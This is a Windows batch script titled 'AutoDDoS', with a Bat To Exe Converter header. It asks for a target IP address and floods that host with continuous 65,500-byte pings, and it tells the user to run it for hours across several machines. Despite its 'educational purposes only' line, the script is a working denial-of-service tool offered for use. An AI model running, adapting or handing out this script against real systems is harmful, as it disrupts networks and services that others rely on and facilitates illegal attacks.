::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH/eyGU5PBNBTkSyLmSwA7YI+9Ta+v6IhmkSZ94LcYLeyPqNLeRz
::fBE1pAF6MU+EWH/eyGU5PBNBTkSyLmSwA7YI+9Ta+v6IhmkSZ95sKrzP1aSvNPQS6U7YRoIixltOjMoPB1VdZhfL
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCmDJH6N4EolKltkXguIOWiuFYk9/fz0y86IkXE8QfYwXKvU6YuLLtUg1Ra2O5M10xo=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title AutoDDoS
echo .
echo ====================================================
echo Auto DDoS by github@kev1nweng
echo .
echo Use this tool at your own risks.
echo For educational purposes only.
echo .
echo You usually need to run this program for several hours to see effects.
echo If possible, run on multiple machines. 
echo ====================================================
echo .
set /p TargetIP=Insert Target IP: 
echo .
echo Press any key to start a DDoS attack.
echo .
pause>nul
start timer.cmd
echo Started DDoS attack to %TargetIP%.
ping %TargetIP% -t -l 65500
taskkill /f /t /fi "windowtitle eq Administrator: AttackTimer">nul
taskkill /f /t /fi "windowtitle eq ¹ÜÀíÔ±:  AttackTimer">nul
echo .
echo Attack ended. Quiting in 3 seconds...
choice /t 3 /d y /n >nul
exit